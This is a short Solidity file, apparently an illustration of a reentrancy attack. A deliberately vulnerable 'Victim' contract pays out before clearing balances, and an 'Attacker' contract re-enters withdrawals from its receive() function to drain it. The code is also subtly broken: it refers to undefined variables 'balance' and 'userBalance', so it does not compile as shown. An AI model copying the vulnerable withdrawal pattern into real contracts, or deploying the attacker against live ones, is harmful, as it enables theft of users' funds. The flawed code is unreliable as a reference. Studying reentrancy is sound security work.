// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

contract Victim {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        uint256 amount = balances[msg.sender];
        // An external call and then a state change!
        // External call
        (bool success,) = msg.sender.call{value: balance}("");
        require(success);

        // State change
        userBalance[msg.sender] = 0;
    }
}

contract Attacker {
    Victim victim;

    constructor(Victim _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}
